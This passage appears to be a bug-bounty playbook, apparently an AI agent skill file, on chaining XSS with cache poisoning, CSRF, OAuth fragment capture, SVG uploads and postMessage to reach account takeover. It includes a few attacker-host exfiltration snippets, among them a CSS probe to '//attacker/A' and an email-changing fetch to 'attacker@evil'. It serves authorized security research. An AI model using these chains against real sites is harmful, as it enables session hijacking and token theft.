   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.

---

## Real Impact Examples

**Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale — every user who visited the sign-in page would have their credentials captured. The bypassed CSP made remediation require both code fixes and cache purging.

**Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer — effectively achieving organization-level account takeover from a single stored payload.

**Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context. Impact: any user with label-creation permissions (often all project members) could inject persistent XSS that triggered for every project visitor, enabling cross-user session theft within the same project namespace.

---

## Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `hunt-cache-poison` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `hunt-csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19 and #20.

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.

### Chain 5b — guarded postMessage handler that still sinks CSS (the Info-grade outcome)

The common case is NOT a missing origin check — it is a handler that validates `event.origin`
correctly and *still* feeds the payload into a sink. On a 2026 engagement:

```js
if(!Je.locations.platforms.includes(o.origin)) return console.error("…rejected, unknown sender");
…
el.innerText = payload.style.css;                     // <style> injection
document.body.classList.add("theme-" + payload.themeId)
```

Grade it by the sink, not by the guard: `eval`/`innerHTML` = High, `location.href` = Low,
**`style.innerText` = Info (CSS injection, no JS execution in any current browser)**. CSS still
buys UI redressing (`::before{content:…}` fake banners inside a trusted frame) and CSS-only
attribute probing (`input[value^="A"]{background:url(//attacker/A)}`).

**Step 0 before any of that — check framability.** `curl -sk -D - -o /dev/null <url> | grep -i frame-ancestors`.
If the page can only be framed by the product's own origin (real case:
`frame-ancestors https://charts.trendspider.com`), then no attacker-reachable origin can deliver a
`postMessage` at all: the browser refuses the frame, the listener never registers, and the
`localhost` / `chartcalc.local` whitelist entries are dead weight. That collapses the finding from
"Info with a precondition" to **defense-in-depth observation — do not file**. Verify by loading the
PoC and showing a blank frame plus zero beacons; that negative is the deliverable.

The severity argument is the whitelist's exact strings: `includes(o.origin)` compares verbatim, so
`http://localhost` means **port 80 only** — `http://localhost:8080` is rejected and reads as
"doesn't reproduce". Own-domain entries make it a force multiplier for an XSS on those origins,
never a standalone bug. PoC construction (iframe + handshake race + 3× fire), the `:8080` control
test that proves the guard works, the URL-controlled `?env=local` API-base side note, and the
reporting shape that survives triage: `references/postmessage-css-injection.md`. To actually reach
origin `http://localhost` without root (and without port 80), run
`scripts/localhost_origin_harness.py --root <pocdir>` and drive Chrome with
`--proxy-server=… --proxy-bypass-list="<-loopback>"` — a PAC file does **not** override Chrome's
implicit loopback bypass.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

Cross-references:
- `hunt-cache-poison` — Chain 1
- `hunt-csrf` — Chain 2
- `hunt-oauth` — Chains 3, 5
- `hunt-file-upload` / `hunt-xxe` — Chain 4
- `hunt-ato` — terminal impact for Chains 2, 3, 4, 5

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.